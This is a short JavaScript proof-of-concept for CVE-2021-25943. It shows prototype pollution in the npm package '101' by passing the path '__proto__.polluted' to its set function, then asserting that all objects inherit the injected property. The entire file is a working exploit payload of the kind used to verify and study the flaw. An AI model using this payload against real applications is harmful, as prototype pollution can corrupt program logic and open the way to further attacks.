//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25943

var _101 = require("101/set");
const assert = require('assert');

var obj = {}
console.log("Before : " + {}.polluted);
_101(obj,'__proto__.polluted','yes');

console.log("After : " + {}.polluted);
assert({}.polluted === "yes")
console.log("payload success!")